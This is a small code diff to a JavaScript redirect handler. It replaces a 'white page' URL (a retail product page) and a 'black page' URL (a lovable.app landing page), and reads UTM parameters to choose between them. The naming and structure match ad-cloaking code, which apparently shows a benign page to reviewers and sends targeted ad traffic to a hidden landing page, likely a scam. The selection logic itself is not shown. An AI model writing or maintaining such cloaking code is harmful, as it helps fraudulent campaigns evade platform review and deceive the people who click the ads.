@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.fanatics.com/soccer-national-teams/germany-national-team/germany-national-team-vive-la-fete-infant-paint-brush-t-shirt-white/o-1434+t-03729489+p-7988369313019+z-9-1011459566?_ref=p-GALP:m-GRID:i-r0c1:po-1";
-    const blackPageURL = "https://casssshlov.lovable.app/?";
+    const whitePageURL = "https://laam.pk/products/pastels-cubic-zirconia-studs-luxury-041";
+    const blackPageURL = "https://msgurupml.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
